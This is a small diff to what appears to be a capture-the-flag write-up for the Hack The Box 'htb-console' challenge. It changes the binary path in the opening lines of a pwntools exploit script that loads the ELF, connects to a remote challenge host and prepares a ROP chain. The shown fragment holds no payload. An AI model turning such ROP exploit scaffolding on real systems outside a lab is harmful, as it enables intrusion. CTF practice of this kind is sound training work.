@@ -123,7 +123,7 @@ fgets(local_18,0x30,stdin)
 ```python
 from pwn import *
 
-elf = context.binary = ELF("./patched_htb-console")
+elf = context.binary = ELF("./htb-console")
 p = elf.process()
 p = remote('159.65.19.24',30324)
 rop = ROP(elf)
